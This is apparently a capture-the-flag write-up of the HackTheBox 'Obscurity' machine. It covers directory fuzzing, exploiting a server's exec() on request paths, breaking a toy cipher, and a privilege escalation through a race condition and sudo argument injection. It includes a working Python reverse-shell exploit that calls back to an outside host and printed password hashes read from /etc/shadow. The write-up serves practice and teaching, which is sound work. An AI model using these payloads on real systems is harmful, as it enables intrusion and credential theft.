---
title: HackTheBox Obscurity
author: Marius Kimmina
date: 2020-05-09 14:10:00 +0800
categories: [CTF, HackTheBox]
tags: [linux, Cryptography]
published: true
---

# 0x0 Introduction
Yet another HackTheBox Box, this time it was all about obscure hidden stuff and reversing some custom crypto Definitely one of the more ctf-like boxes as this is (probably, you never know) not something you would encounter in a real-world pentest. It was a very interesting box nevertheless.
![image](/assets/images/obsurity_htb.png "Obscurity Logo")

# 0x1 getting a foothold

As always I started the box with an nmap scan but this is were the box already started to live up to its name.

```
$ nmap -sV -sC -oN nmap 10.10.10.168
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 08:44 CET
Segmentation fault
```

Nmap got a freaking segmentation fault, gotta be honest that had me laughing for a while.
I guess it got the segfaults on the scripts (-sC) or version enumeration (-sV) because a simple scan  
on all Ports (-p-) worked just fine and returned the following:

```
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   closed http
8080/tcp open   http-proxy
9000/tcp closed cslistener
```

so going to the Web-Server through port 8080 we see the Website of "Obscura" and they tell us they have written a custom web-server, an encryption algorithm and a new ssh implementation. Which is basically a list of things you should not do. As for the crypto one, everyone who has been in development or in security for a while has heard the "Never implement your own crypto" advise at some point. And Implementing your own custom web-server or ssh client kind of falls into the same category.

They also left a Message to their developers on the Site -> "Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory". To find this "secure development directory" has caused me quite a bit of headache as I really could not find anything using gobuster, no matter the wordlist. After a while it came to me tho that the right directory might also return 404 if we do not go directly to /right-directory-name/SuperSecureServer.py. This is were wfuzz came into play as it is just perfect for this job.

```
mindslave@kalibox:~/hackthebox/Obscurity$ wfuzz -c --hc 404 -w /usr/share/wordlists/dirb/common.txt http://10.10.10.168:8080/FUZZ/SuperSecureSever.py

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
Total requests: 4614

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                      
===================================================================

000001245:   200        170 L    498 W    5892 Ch     "develop" 
```

So lets have a look at "SuperSecureServer.py"

```py
import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

respTemplate = """HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""
DOC_ROOT = "DocRoot"

CODES = {"200": "OK", 
        "304": "NOT MODIFIED",
        "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
        "500": "INTERNAL SERVER ERROR"}

MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
        "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
        "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}


class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        now = datetime.now()
        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
    def stringResponse(self):
        return respTemplate.format(**self.__dict__)

class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):        
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}


class Server:
    def __init__(self, host, port):    
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the recieved data 
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False
    
    def handleRequest(self, request, conn, address):
        if request.good:
#            try:
                # print(str(request.method) + " " + str(request.doc), end=' ')
                # print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]
        
        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"


        resp = Response(
        statusNum=statusNum, statusCode=statusCode, 
        dateSent = dateSent, server = server, 
        modified = modified, length = length, 
        contentType = contentType, connectionType = connectionType, 
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}

```

And hey, there is an 'exec' statement which seems to work with user input, lucky us.

```
exec(info.format(path)) # This is how you do string formatting, right?
```

Definietly the right way to format strings. Let's get there, when we send a request to the Server the first function we pass is listenToClient() which receives our request and then parses it into the "Request"-Class. In "ParseRequest" I saw that the first line of my request would get split into 3 parts separated by spaces. Which makes sense if we think about a normal request that would start like this

```
GET / HTTP/1.1
```
method would be equal to 'GET', doc would be equal to '/' and vers would be equal to 'HTTP/1.1'. Now when I followed the request further I could see that the doc part of our requests lands in the exec statement.
To test this out I modiefied the code with a bunch of print statements and added the following to run the server locally

```py
if __name__ == "__main__":
    Server = Server(127.0.0.1, 5000)
    Server.listen()
```


So since exec() executes python code, instead of requesting some normal url-endpoint we put our python code there to spawn a reverse shell. After messing around with the formating a bit I came up with the following exploit script, which is just your typical python reverse shell (from pentestmonkey.net), connecting to my ip at port 9999, with some extra formating which we had to do because our code was still insdie the info.format():


```py
import requests
import urllib

url = 'http://10.10.10.168:8080/'

path = '5\'' + '\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.77",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\na=\''

path_encoded = urllib.parse.quote(path)

print("sending request to: " + url + path_encoded)
r = requests.get(url+path_encoded)
```

Which when I execute it after starting netcat, gave me a shell on the box.

```bash
$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.77] from (UNKNOWN) [10.10.10.168] 47698
www-data@obscure:/$
```

# 0x2 Getting the user.txt

As www-data we can go to the directory of 'robert' and have the permission to read most his files,  
including the "BetterSSH.py" and "SuperSecureCrpyt.py". For the user it seems that the "SuperSecureCrypt"  
is the relevant part since we also found an encrpyted "passwordreminder" file in the robert directory.
Lets have a look at "SuperSecureCrypt.py":

```py
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
```

Knowing the encrypt and decrypt function I could come up with a genkey() function.
I also wrote the script to work with files as input. I have added comments to clarify how the keygen works, if you want to know more about why this encrpytion could be broken so easily you should google the concept of 'diffusion' in cryptography

```py
import argparse

parser = argparse.ArgumentParser(description='Key generator')
parser.add_argument('-e',
                    metavar='',
                    type=str,
                    help='Encrypted message',
                    required=True)

parser.add_argument('-p',
                    metavar='',
                    type=str,
                    help='Plaintext message',
                    required=True)

args = parser.parse_args()
with open(args.e,'r',encoding='UTF-8') as f:
    encrypted=f.read()
with open(args.p,'r',encoding='UTF-8') as f:
    original=f.read()

#we are going to get the key one character at the time, this works perfectly fine here since this cipher does not have any diffusion
def genKey(original, encrypted):
    key = ""
    position = -1
    #gotta go through all the characters in the encrypted text 
    for x in encrypted:
        #start at position 0
        position += 1
        encrypted_char = ord(x)
        #Look for the correct character in Ascii range
        for i in range(48, 123):
            decrypted = chr((encrypted_char - i) % 255)
            #check if the decryption worked with this character
            if decrypted == original[position]:
                #if yes add this character to our key
                key += chr(i)
                break
    return key

key = genKey(original, encrypted)
print(key)
```

Using this script as seen below:

```
www-data@obscure:/home/robert$ python3 /tmp/keygen2.py -e out.txt -p check.txt 
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal
```

We now know that the key is "alexandrovich".  
Once we use that key with the "passwordreminder" file we get the password for robert and can login as him via ssh

**SecThruObsFTW**


```
robert@obscure:~$
```

# 0x03 getting the root.txt

To get root we had to abuse the "BetterSSH.py". Lets have a look at the source code.


```py
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')

```

Here we have a race condition. if we look at this part of the script 

```py
with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
```

It writes to a file in /tmp/SSH, we just have to interfere and read this file bevore it gets removed, wich happems here:

```py
if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
```

The filename for this passwordfile in /tmp/SSH is complete random tho as you know from this line

```py
path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
```

But what we can do is, that we go to /tmp/SSH and execute:

```
watch -n .5 cp * /dev/shm
```

And now this is going to copy everything in /tmp/SSH/ every 0.5 seconds to /dev/shm, if we execute the BetterSSH now while this is running we are going to find a randomly named file with the following content in /dev/shm
```
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7


robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
```

So we could now go and crack this hash, or we use another mistake that was made in this BetterSSH.py, which we can see here: 

```py
if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
```

This means that all our commands that we run in this ssh are executed as sudo -u robert {command}, which results in our commands being run as the user robert, but if our command is

```
-u root whoami
```

we can see that the command got executed as root. Which means we are able to get root-flag with 

```
-u root cat /root/root.txt
```

# 0x04 Closing words

This was my first 'medium' rated box and it was one hell of a ride, Thanks to the author of the box I learned a lot from solving this one.
